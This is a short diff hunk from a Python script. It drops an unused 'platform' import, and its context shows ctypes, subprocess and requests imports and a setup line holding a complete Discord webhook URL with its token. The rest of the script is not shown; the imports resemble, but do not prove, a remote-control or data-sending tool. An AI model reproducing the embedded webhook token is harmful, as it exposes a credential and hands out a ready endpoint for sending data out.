@@ -2,7 +2,6 @@ import ctypes
 import subprocess
 import time
 import requests
-import platform
 
 # === Setup ===
 WEBHOOK_URL = "https://discord.com/api/webhooks/1356810627909419079/5L26qDamgl753mBQL873Mq982SK6K4_2HH-mMmrfkOASId1GXyup-vVKOXbbDw6OC2iO"  # Your Discord Webhook URL
